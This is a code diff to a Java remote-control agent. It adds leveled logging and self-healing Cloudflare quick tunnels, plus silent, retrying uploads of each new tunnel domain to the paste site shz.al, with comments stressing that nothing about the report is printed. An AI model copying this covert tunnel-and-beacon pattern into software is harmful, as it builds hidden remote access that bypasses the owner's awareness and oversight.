@@ -48,7 +48,14 @@ public class kisama {
     private final String KEYS_DIR;
     private final String ECDSA_PUBLIC_KEY_B64;
     private final String ECIES_PUBLIC_KEY_B64;
-    private final boolean LOG;
+    // 四级阈值日志 (对齐 js/go): DEBUG=0/INFO=1/WARN=2/ERROR=3
+    private static final int LOG_LEVEL_DEBUG = 0;
+    private static final int LOG_LEVEL_INFO = 1;
+    private static final int LOG_LEVEL_WARN = 2;
+    private static final int LOG_LEVEL_ERROR = 3;
+    private static final String[] LOG_LEVEL_NAMES = {"DEBUG", "INFO", "WARN", "ERROR"};
+    // 输出阈值: LOG_LEVEL 环境变量控制 (0~3), 缺省 3=只输出错误日志; DEBUG=true 接管为 0 (调试全量输出)
+    private final int logLevel;
 
     private final java.util.concurrent.atomic.AtomicBoolean ONETIME_EXECUTED = new java.util.concurrent.atomic.AtomicBoolean(false);
     // KMODE 运行时状态: 域名文件只删一次 / 内存中最后已知域名 (文件删除后 /domain 仍可用)
@@ -96,7 +103,7 @@ public class kisama {
             synchronized (statusCacheLock) { statusCache = null; lastStatusCacheTime = 0; }
             log("[SECURITY] 🔄 临时密钥过期, 已轮换 SESSION_KEY 与控制端 Noise 密钥对 (合法控制端需重新认证获取 baseinfo 新密钥)");
         } catch (Exception e) {
-            log("[SECURITY] ❌ 密钥轮换失败: " + e.getMessage());
+            logError("[SECURITY] ❌ 密钥轮换失败: " + e.getMessage());
         }
     }
 
@@ -157,7 +164,7 @@ public class kisama {
 
     private static final int TEMPKEY_DEFAULT_TTL_HOURS = Integer.parseInt(DOTENV.getOrDefault("TEMPKEY_TTL", "24"));
     private static final int TEMPKEY_MAX_TTL_HOURS = Integer.parseInt(DOTENV.getOrDefault("TEMPKEY_MAX_TTL", "168"));
-    private static final String AGENT_VERSION = "0.5.1-java";
+    private static final String AGENT_VERSION = "0.5.3-java";
 
     private Map<String, Object> baseInfoCache = null;
     private long lastBaseInfoCacheTime = 0;
@@ -187,7 +194,7 @@ public class kisama {
         this.KEYS_DIR = DOTENV.getOrDefault("KEYS_DIR", "./keys");
         this.ECDSA_PUBLIC_KEY_B64 = getKeyWithFallback("ECDSA_PUBKEY", "agent_ecdsa_pub.pem", "YOUR_HARDCODED_ECDSA_PUBLIC_KEY_HERE");
         this.ECIES_PUBLIC_KEY_B64 = getKeyWithFallback("ECIES_PUBKEY", "agent_ecies_pub.b64", "YOUR_HARDCODED_ECIES_PUBLIC_KEY_HERE");
-        this.LOG = Boolean.parseBoolean(DOTENV.getOrDefault("LOG", "false"));
+        this.logLevel = resolveLogLevel();
     }
 
     // 2. 有参构造函数（重载）：允许外部模块直接覆盖核心 3 要素，其余继续走默认初始化
@@ -208,12 +215,27 @@ public class kisama {
         this.KPATH = DOTENV.getOrDefault("KPATH", "");
         this.FILE_ROOT = resolveSafeFileRoot();
         this.KEYS_DIR = DOTENV.getOrDefault("KEYS_DIR", "./keys");
-        this.LOG = Boolean.parseBoolean(DOTENV.getOrDefault("LOG", "false"));
+        this.logLevel = resolveLogLevel();
+    }
+
+    // 解析日志输出阈值 (对齐 js/go): 显式设置 LOG_LEVEL (0~3, 非法回退 3) 时优先生效;
+    // 未显式设置时 DEBUG=true 接管为 0 (调试全量), 否则缺省 3 (只输出错误)
+    private static int resolveLogLevel() {
+        String raw = DOTENV.get("LOG_LEVEL");
+        if (raw != null && !raw.isBlank()) {
+            try {
+                int level = Integer.parseInt(raw.trim());
+                return Math.max(LOG_LEVEL_DEBUG, Math.min(LOG_LEVEL_ERROR, level));
+            } catch (NumberFormatException ignored) {
+            }
+        }
+        boolean debug = Boolean.parseBoolean(DOTENV.getOrDefault("DEBUG", "false"));
+        return debug ? LOG_LEVEL_DEBUG : LOG_LEVEL_ERROR;
     }
     // ==================== 生命周期管理 ====================
     public void start() throws Exception {
         if (isRunning) {
-            log("[TRACE-INIT] ⚠️ Agent 已经在运行中，忽略重复启动请求。");
+            logWarn("[TRACE-INIT] ⚠️ Agent 已经在运行中，忽略重复启动请求。");
             return;
         }
 
@@ -249,7 +271,7 @@ public class kisama {
                 }
             } catch (Exception e) {
                 if (this.DEBUG) {
-                    log("[TRACE-CRON] ❌ 定时调度运行时发生异常: " + e.getMessage());
+                    logError("[TRACE-CRON] ❌ 定时调度运行时发生异常: " + e.getMessage());
                 }
             }
         }, 30, 30, TimeUnit.SECONDS);
@@ -334,7 +356,7 @@ public class kisama {
                 log("[TRACE-AUTH] ✅ ECDSA 签名核验完全匹配，确立合法已认证身份 (" + keySource + ")。");
                 
             } catch (Exception e) {
-                log("[TRACE-AUTH] ❌ 强认证失败: 验签爆裂 -> " + e.getMessage());
+                logError("[TRACE-AUTH] ❌ 强认证失败: 验签爆裂 -> " + e.getMessage());
                 if (isBypassPath) {
                     return; // 验签失败如果是白名单路由，保留其 false 标签并允许放行
                 } else {
@@ -352,7 +374,7 @@ public class kisama {
                         Object parsed = this.gson.fromJson(json, new TypeToken<Object>() {}.getType());
                         req.attribute("json_body", parsed);
                     } catch (Exception e) {
-                        log("[TRACE-DECRYPT] ❌ 逆向解密失败: " + e.getMessage());
+                        logError("[TRACE-DECRYPT] ❌ 逆向解密失败: " + e.getMessage());
                         halt(400, this.gson.toJson(Map.of("error", "Invalid encrypted body: " + e.getMessage())));
                     }
                 } else {
@@ -1101,7 +1123,7 @@ public class kisama {
         this.scheduler.shutdownNow();
         try {
             if (!this.scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
-                log("[TRACE-INIT] ⚠️ 调度器未能在 5 秒内完全关闭");
+                logWarn("[TRACE-INIT] ⚠️ 调度器未能在 5 秒内完全关闭");
             }
         } catch (InterruptedException e) {
             Thread.currentThread().interrupt();
@@ -1142,7 +1164,7 @@ public class kisama {
         if (!valid && !knameHintShown) {
             knameHintShown = true;
             // 走 log() (DEBUG/LOG 开启时输出, 否则静默)
-            log("[KMODE] ⚠️ KMODE=2 未生效, 条件不满足: " + String.join("; ", reasons)
+            logWarn("[KMODE] ⚠️ KMODE=2 未生效, 条件不满足: " + String.join("; ", reasons)
                     + " (KNAME=" + (KNAME == null ? "(未设置)" : KNAME)
                     + ", KNAME_KEY=" + (DOTENV.get("KNAME_KEY") == null || DOTENV.get("KNAME_KEY").isBlank() ? "(未设置, 缺省复用 KNAME)" : DOTENV.get("KNAME_KEY")) + ")");
             log("[KMODE] 💡 修正: 设置 ≥8 字符的 KNAME 且 (可选) KNAME_KEY ≥8 字符, 例如: KNAME=myname KNAME_KEY=mysecret-pass");
@@ -1151,8 +1173,8 @@ public class kisama {
     }
 
     // 上报隧道域名到 shz.al: POST 创建 (409 冲突则 PUT 覆盖), 全程静默 —
-    // 不输出域名 / 上报结果 / 平台 URL, 任何失败直接放弃, 不影响正常启动
-    private void reportToShzal(String domain) {
+    // 不输出域名 / 上报结果 / 平台 URL, 失败返回 false, 不影响正常启动
+    private boolean reportToShzal(String domain) {
         try {
             String boundary = "----kisama" + java.util.UUID.randomUUID().toString().replace("-", "");
             StringBuilder sb = new StringBuilder();
@@ -1187,6 +1209,10 @@ public class kisama {
                 log("[KMODE-DEBUG] report status: " + resp.statusCode() + " body: "
                         + resp.body().substring(0, Math.min(200, resp.body().length())));
             }
+            if (resp.statusCode() == 200) {
+                this.kmodeDomain = domain;
+                return true;
+            }
             if (resp.statusCode() == 409) {
                 // 名字已被占用 (上次粘贴未过期): PUT 覆盖更新
                 java.net.http.HttpRequest put = java.net.http.HttpRequest.newBuilder()
@@ -1202,12 +1228,36 @@ public class kisama {
                     log("[KMODE-DEBUG] put status: " + putResp.statusCode() + " body: "
                             + putResp.body().substring(0, Math.min(200, putResp.body().length())));
                 }
+                if (putResp.statusCode() == 200) {
+                    this.kmodeDomain = domain;
+                    return true;
+                }
+                return false;
             }
-            this.kmodeDomain = domain;
+            return false;
         } catch (Exception e) {
             // 全程静默; DEBUG 模式下经 log() 输出诊断 (不含域名)
             if (this.DEBUG) {
                 log("[KMODE-DEBUG] report 异常: " + e);
+            }
+            return false;
+        }
+    }
+
+    // 🛡️ 守护重建后的新域名上报: 指数退避重试 3 次 (2s/4s/8s), 全程静默 —
+    // 新域名必须尽量送达, 否则控制端按预测 URL 将读到旧值/404
+    private void reportDomainChange(String domain) {
+        for (int attempt = 0; attempt < 3; attempt++) {
+            if (reportToShzal(domain)) {
+                return;
+            }
+            if (attempt < 2) {
+                try {
+                    Thread.sleep(1000L * (1L << (attempt + 1)));
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    return;
+                }
             }
         }
     }
@@ -1247,7 +1297,7 @@ public class kisama {
             Files.write(file, domain.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING, StandardOpenOption.WRITE);
             log("[KMODE] 📄 隧道域名已写入: " + file);
         } catch (IOException e) {
-            log("[KMODE] ⚠️ 域名文件写入失败: " + e.getMessage());
+            logWarn("[KMODE] ⚠️ 域名文件写入失败: " + e.getMessage());
         }
     }
 
@@ -1259,7 +1309,7 @@ public class kisama {
                 log("[KMODE] 🗑️ 域名文件已删除: " + file);
             }
         } catch (IOException e) {
-            log("[KMODE] ⚠️ 域名文件删除失败: " + e.getMessage());
+            logWarn("[KMODE] ⚠️ 域名文件删除失败: " + e.getMessage());
         }
     }
 
@@ -1289,6 +1339,8 @@ public class kisama {
         // KMODE=1: 隧道 + 域名文件 + stdin 监听; KMODE=2: 隧道 + shz.al 静默上报
         if (KMODE == 2 && knameValid()) {
             log("[KMODE] 🚀 KMODE=2: 隧道域名将上报至外部平台");
+            // 🛡️ 守护重建换新域名时自动重新上报 (静默重试, 回调在独立线程执行)
+            this.argoTunnelManager.onDomainChange = (oldDomain, newDomain) -> reportDomainChange(newDomain);
             Thread tunnelThread = new Thread(() -> {
                 try {
                     ArgoTunnelManager.TunnelEntry entry = this.argoTunnelManager.create(this.PORT, false);
@@ -1302,12 +1354,14 @@ public class kisama {
             return;
         }
         log("[KMODE] 🚀 KMODE=1: 启动时自动创建临时隧道");
+        // 🛡️ 守护重建换新域名时自动重写域名文件 (原文件可能已被 baseinfo 钩子删除)
+        this.argoTunnelManager.onDomainChange = (oldDomain, newDomain) -> writeDomainFile(newDomain);
         Thread tunnelThread = new Thread(() -> {
             try {
                 ArgoTunnelManager.TunnelEntry entry = this.argoTunnelManager.create(this.PORT, false);
                 writeDomainFile(entry.tunnelDomain);
             } catch (Exception e) {
-                log("[KMODE] ⚠️ 启动隧道创建失败: " + e.getMessage());
+                logWarn("[KMODE] ⚠️ 启动隧道创建失败: " + e.getMessage());
             }
         }, "kmode-tunnel");
         tunnelThread.setDaemon(true);
@@ -1326,9 +1380,29 @@ public class kisama {
 
     // ==================== 辅助方法 (原 static 方法改造为实例方法) ====================
     public void log(String message) {
-        // DEBUG=true 时也输出 (与 JS/Python 的 logger 语义一致: DEBUG 开启即可见, 否则受 LOG 控制)
-        if (this.LOG || this.DEBUG) {
-            System.out.println(message);
+        logAt(LOG_LEVEL_INFO, message);
+    }
+
+    // WARN 级日志: LOG_LEVEL<=2 时输出
+    public void logWarn(String message) {
+        logAt(LOG_LEVEL_WARN, message);
+    }
+
+    // ERROR 级日志: 缺省阈值 (3) 下仍输出, 分流 stderr (对齐 py/go)
+    public void logError(String message) {
+        logAt(LOG_LEVEL_ERROR, message);
+    }
+
+    // 四级阈值输出 (对齐 js/go Logger): level >= logLevel 才输出, 统一带 [级别] 前缀
+    private void logAt(int level, String message) {
+        if (level < this.logLevel) {
+            return;
+        }
+        String line = "[" + LOG_LEVEL_NAMES[level] + "] " + message;
+        if (level == LOG_LEVEL_ERROR) {
+            System.err.println(line);
+        } else {
+            System.out.println(line);
         }
     }
 
@@ -2105,13 +2179,13 @@ public class kisama {
                 this.ECDSA_PUBLIC_KEY = loadEcdsaPublicKey(ecdsaStr);
                 log("[TRACE-CRYPTO] ✅ ECDSA 安全公钥加载成功 (DEBUG)。");
             } catch (Exception e) {
-                log("[TRACE-CRYPTO] ⚠️ DEBUG 模式: ECDSA 公钥未配置或非法，已跳过 (" + e.getMessage() + ")");
+                logWarn("[TRACE-CRYPTO] ⚠️ DEBUG 模式: ECDSA 公钥未配置或非法，已跳过 (" + e.getMessage() + ")");
             }
             try {
                 this.ECIES_PUBLIC_KEY = Base64.getDecoder().decode(eciesStr.trim());
                 log("[TRACE-CRYPTO] ✅ ECIES 安全公钥 Base64 解码成功 (DEBUG)。");
             } catch (Exception e) {
-                log("[TRACE-CRYPTO] ⚠️ DEBUG 模式: ECIES 公钥未配置或非法，已跳过 (" + e.getMessage() + ")");
+                logWarn("[TRACE-CRYPTO] ⚠️ DEBUG 模式: ECIES 公钥未配置或非法，已跳过 (" + e.getMessage() + ")");
             }
         } else {
             try {
@@ -2147,7 +2221,7 @@ public class kisama {
                 System.err.println("[FATAL-INIT] ❌ 读取密钥文件失败: " + path + ", 原因: " + e.getMessage());
             }
         } else {
-            log("[TRACE-INIT] ⚠️ 密钥文件未找到: " + path + "，将尝试后续逻辑。");
+            logWarn("[TRACE-INIT] ⚠️ 密钥文件未找到: " + path + "，将尝试后续逻辑。");
         }
         return null;
     }
@@ -2234,7 +2308,7 @@ public class kisama {
                 try {
                     onExpired.run();
                 } catch (Exception e) {
-                    log("[TEMPKEY] ❌ 过期轮换失败: " + e.getMessage());
+                    logError("[TEMPKEY] ❌ 过期轮换失败: " + e.getMessage());
                 }
             }
         }
@@ -2926,11 +3000,62 @@ public class kisama {
     // ==================== 🌟 Argo 临时隧道模块 (纯 Java 移植 Cloudflare Quick Tunnel 协议) ====================
     // 与 js/agent.js + cftunnel-product.js 语义完全一致: 手写 HTTP/2 + HPACK + Cap'n Proto 协议栈
     private static final String QUICK_SERVICE = "https://api.trycloudflare.com";
-    private static final String[] EDGE_HOSTS = {"region1.v2.argotunnel.com", "region2.v2.argotunnel.com"};
+
+    // edge 入口可用 KISAMA_EDGE_HOSTS 覆盖 (逗号分隔); 守护自愈测试借此模拟"连续连不上 edge"
+    private static final String[] EDGE_HOSTS = edgeHosts();
+
+    private static String[] edgeHosts() {
+        String raw = DOTENV.get("KISAMA_EDGE_HOSTS");
+        List<String> hosts = new ArrayList<>();
+        if (raw != null && !raw.isBlank()) {
+            for (String h : raw.split(",")) {
+                if (!h.isBlank()) {
+                    hosts.add(h.trim());
+                }
+            }
+        }
+        if (hosts.isEmpty()) {
+            hosts.add("region1.v2.argotunnel.com");
+            hosts.add("region2.v2.argotunnel.com");
+        }
+        return hosts.toArray(new String[0]);
+    }
+
     private static final int EDGE_PORT = 7844;
     private static final String CONTROL_HEADER = "cf-cloudflared-proxy-connection-upgrade";
     private static final String CONTROL_STREAM = "control-stream";
     private static final int MAX_FRAME_SIZE = 16384;
+
+    // 🛡️ 守护自愈: trycloudflare 临时资源在 edge 连接全断后会被 Cloudflare 回收, 旧凭据重连
+    // 注册永远失败 (域名永久失效, 即"ECONNRESET 后连不上"的根因)。连续失败 N 次后重新注册
+    // 换取新域名并回调通知 (KMODE=2 自动再上报 / KMODE=1 自动重写域名文件)。
+    private static final int ARGO_REREGISTER_AFTER = argoEnvInt("KISAMA_ARGO_REREGISTER_AFTER", 5, 2);
+    private static final long ARGO_REREGISTER_RETRY_SECONDS = 30;   // 重新注册失败后的退避
+    // 读空闲超时 (秒): edge 有周期 PING, 长时间无任何入站数据 = 半开假死, 主动断开走重连; 0=禁用
+    private static final int ARGO_IDLE_TIMEOUT = argoIdleTimeout();
+
+    private static int argoEnvInt(String name, int fallback, int minimum) {
+        String raw = DOTENV.get(name);
+        if (raw == null || raw.isBlank()) {
+            return fallback;
+        }
+        try {
+            int value = Integer.parseInt(raw.trim());
+            return value < minimum ? fallback : value;
+        } catch (NumberFormatException e) {
+            return fallback;
+        }
+    }
+
+    private static int argoIdleTimeout() {
+        // 0=禁用; 未设置/非法回退 300; 生效值最小 10 秒 (过小会把正常空闲误判为断线)
+        String raw = DOTENV.get("KISAMA_ARGO_IDLE_TIMEOUT");
+        if (raw != null && raw.trim().equals("0")) {
+            return 0;
+        }
+        return argoEnvInt("KISAMA_ARGO_IDLE_TIMEOUT", 300, 10);
+    }
+
     private static final java.util.regex.Pattern UUID_RE = java.util.regex.Pattern.compile(
             "^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$");
 
@@ -3816,7 +3941,7 @@ public class kisama {
                 return connectEdgeHost(host);
             } catch (Exception e) {
                 lastError = e;
-                agent.log("[TRACE-ARGO] ⚠️ 边缘节点 " + host + " 连接失败: " + e.getMessage());
+                agent.logWarn("[TRACE-ARGO] ⚠️ 边缘节点 " + host + " 连接失败: " + e.getMessage());
             }
         }
         throw new Exception("all Cloudflare edges failed: " + (lastError != null ? lastError.getMessage() : "unknown"));
@@ -3837,7 +3962,8 @@ public class kisama {
             sock.close();
             throw new Exception("edge did not negotiate h2");
         }
-        sock.setSoTimeout(0);
+        // 🛡️ 空闲超时防半开假死: 超时从 readFrame 以 SocketTimeoutException 冒泡, 整条连接作废走重连
+        sock.setSoTimeout(ARGO_IDLE_TIMEOUT > 0 ? ARGO_IDLE_TIMEOUT * 1000 : 0);
         return sock;
     }
 
@@ -4035,6 +4161,7 @@ public class kisama {
         ControlStream control = null;
         volatile boolean stopped = false;
         volatile boolean registered = false;
+        volatile boolean registrationFailed = false;
 
         H2Connection(kisama agent, javax.net.ssl.SSLSocket sock, String origin, String accountTag,
                      byte[] tunnelSecret, byte[] tunnelId, int connIndex) throws IOException {
@@ -4267,7 +4394,7 @@ public class kisama {
                     sendData(streamId, new byte[0], true);
                 }
             } catch (Exception e) {
-                agent.log("[TRACE-ARGO] ⚠️ 流 " + streamId + " 代理失败: " + e.getMessage());
+                agent.logWarn("[TRACE-ARGO] ⚠️ 流 " + streamId + " 代理失败: " + e.getMessage());
                 try {
                     sendHeaders(streamId, List.<String[]>of(new String[]{":status", "502"}), true);
                 } catch (Exception ignored) {
@@ -4482,8 +4609,11 @@ public class kisama {
                                 + (result.location != null ? result.location : "unknown"));
                         connection.registered = true;
                     } else {
-                        connection.agent.log("[TRACE-ARGO] ⚠️ 隧道注册失败: "
+                        connection.agent.logWarn("[TRACE-ARGO] ⚠️ 隧道注册失败: "
                                 + (result.error != null ? result.error : "unknown error"));
+                        // 🛡️ 注册失败: 结束本轮连接, 由守护线程计数, 连续失败达阈值后自动重新注册换新域名
+                        connection.registrationFailed = true;
+                        connection.stopped = true;
                     }
                 } catch (Exception e) {
                     connection.agent.log("[TRACE-ARGO] 忽略控制 RPC 消息: " + e.getMessage());
@@ -4574,7 +4704,7 @@ public class kisama {
                 writer.start();
                 pumpOrigin();
             } catch (Exception e) {
-                connection.agent.log("[TRACE-ARGO] ⚠️ WebSocket 流 " + streamId + " 失败: " + e.getMessage());
+                connection.agent.logWarn("[TRACE-ARGO] ⚠️ WebSocket 流 " + streamId + " 失败: " + e.getMessage());
                 try {
                     connection.sendHeaders(streamId, List.<String[]>of(new String[]{":status", "502"}), true);
                 } catch (Exception ignored) {
@@ -4667,6 +4797,8 @@ public class kisama {
     // ==================== 🌟 Argo 临时隧道管理器 (与 js/agent.js 语义一致) ====================
     private final class ArgoTunnelManager {
         private final Map<Integer, List<TunnelEntry>> tunnels = new ConcurrentHashMap<>();
+        // 🛡️ 守护重建换新域名时的回调 (oldDomain, newDomain); KMODE 接线后自动再上报/重写域名文件
+        volatile java.util.function.BiConsumer<String, String> onDomainChange = null;
 
         TunnelEntry create(int port, boolean duplicate) throws TunnelException {
             synchronized (tunnels) {
@@ -4798,8 +4930,11 @@ public class kisama {
 
         private void runLoop(TunnelEntry entry, String accountTag, byte[] tunnelSecret, byte[] tunnelId) {
             String origin = "http://127.0.0.1:" + entry.port;
+            int failures = 0;   // 🛡️ 连续失败计数 (连接失败/注册失败): 本轮注册过=旧凭据仍有效, 清零
+            int connIndex = 0;  // 注册索引轮换, 降低 edge 侧旧连接残留导致的注册拒绝
             while (!entry.stopped) {
                 javax.net.ssl.SSLSocket sock = null;
+                H2Connection conn = null;
                 try {
                     sock = connectEdge(kisama.this);
                     if (entry.stopped) {
@@ -4810,10 +4945,12 @@ public class kisama {
                         break;
                     }
                     entry.sock = sock;
-                    new H2Connection(kisama.this, sock, origin, accountTag, tunnelSecret, tunnelId, 0).run();
+                    connIndex = (connIndex + 1) % 4;
+                    conn = new H2Connection(kisama.this, sock, origin, accountTag, tunnelSecret, tunnelId, connIndex);
+                    conn.run();
                 } catch (Exception e) {
                     if (!entry.stopped) {
-                        log("[TRACE-ARGO] ⚠️ 临时隧道连接中断: " + entry.tunnelDomain + " -> " + e.getMessage());
+                        logWarn("[TRACE-ARGO] ⚠️ 临时隧道连接中断: " + entry.tunnelDomain + " -> " + e.getMessage());
                     }
                 } finally {
                     if (sock != null) {
@@ -4823,6 +4960,32 @@ public class kisama {
                         }
                     }
                     entry.sock = null;
+                }
+                if (entry.stopped) {
+                    break;
+                }
+                // 🛡️ 守护计数: 本轮注册过=旧凭据仍有效; 未注册=凭据可能已被 Cloudflare 回收
+                if (conn != null && conn.registered) {
+                    failures = 0;
+                } else {
+                    failures += 1;
+                    if (failures >= ARGO_REREGISTER_AFTER) {
+                        // 🛡️ 旧凭据已被 Cloudflare 回收: 重新注册换取新域名, 回调通知后继续新域名下的重连
+                        QuickTunnelInfo re = reregister(entry);
+                        if (re != null) {
+                            accountTag = re.accountTag;
+                            tunnelSecret = re.secret;
+                            tunnelId = re.tunnelId;
+                            failures = 0;
+                        } else {
+                            // 重新注册失败: 退避更久再试, 避免高频请求 api.trycloudflare.com
+                            try {
+                                Thread.sleep(ARGO_REREGISTER_RETRY_SECONDS * 1000L);
+                            } catch (InterruptedException e) {
+                                break;
+                            }
+                        }
+                    }
                 }
                 if (!entry.stopped) {
                     try {
@@ -4834,8 +4997,38 @@ public class kisama {
             }
         }
 
+        // 🛡️ 重新注册快速隧道: 成功则更新 entry.tunnelDomain 并触发 onDomainChange 回调
+        // (KMODE=2 自动再上报 shz.al / KMODE=1 自动重写域名文件)。成功返回新凭据。
+        private QuickTunnelInfo reregister(TunnelEntry entry) {
+            QuickTunnelInfo info;
+            try {
+                info = requestQuickTunnel(QUICK_SERVICE);
+            } catch (Exception e) {
+                logWarn("[TRACE-ARGO] ⚠️ 重新注册失败: " + e.getMessage());
+                return null;
+            }
+            String oldDomain = entry.tunnelDomain;
+            String newDomain = info.hostname.startsWith("https://") ? info.hostname : "https://" + info.hostname;
+            entry.tunnelDomain = newDomain;
+            log("[TRACE-ARGO] 🔁 临时隧道域名已更换: " + oldDomain + " -> " + newDomain);
+            java.util.function.BiConsumer<String, String> callback = onDomainChange;
+            if (callback != null) {
+                // 回调在独立线程执行: 上报网络耗时不阻塞重连循环, 异常不影响守护
+                Thread t = new Thread(() -> {
+                    try {
+                        callback.accept(oldDomain, newDomain);
+                    } catch (Exception ignored) {
+                    }
+                }, "argo-domain-change");
+                t.setDaemon(true);
+                t.start();
+            }
+            return info;
+        }
+
         static final class TunnelEntry {
-            final String tunnelDomain;
+            // 🛡️ 非 final: 守护重新注册后域名会变化, list/remove 接口始终呈现最新域名
+            volatile String tunnelDomain;
             final int port;
             final String createdAt;
             volatile boolean stopped = false;
